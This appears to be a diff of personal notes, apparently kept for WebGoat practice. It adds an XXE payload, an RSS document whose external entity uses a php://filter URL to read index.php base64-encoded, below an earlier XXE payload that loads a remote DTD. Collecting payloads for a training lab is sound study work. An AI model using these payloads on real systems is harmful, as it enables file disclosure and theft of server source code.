@@ -19,6 +19,32 @@ java docker webgoat
 <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]><comment>  <text>&eval;</text></comment>
 
 
+
+
+
+<?xml version="1.0" encoding="UTF-8" ?>
+<!DOCTYPE r [
+<!ELEMENT r ANY >
+<!ENTITY sp SYSTEM "php://filter/read=convert.base64-encode/resource=index.php">
+]>
+<rss version="2.0">
+<channel>
+  <title>&sp;</title>
+  <link>https://www.w3schools.com</link>
+  <description>Free web building tutorials</description>
+  <item>
+    <title>&sp;</title>
+    <link>https://www.w3schools.com/xml/xml_rss.asp</link>
+    <description>New RSS tutorial on W3Schools</description>
+  </item>
+  <item>
+    <title>XML Tutorial</title>
+    <link>https://www.w3schools.com/xml</link>
+    <description>New XML tutorial on W3Schools</description>
+  </item>
+</channel>
+</rss>
+
 ubuntu 
 #deb http://cn.archive.ubuntu.com/ubuntu/ precise main restricted universe multiverse
 #apt-get install python-software-properties
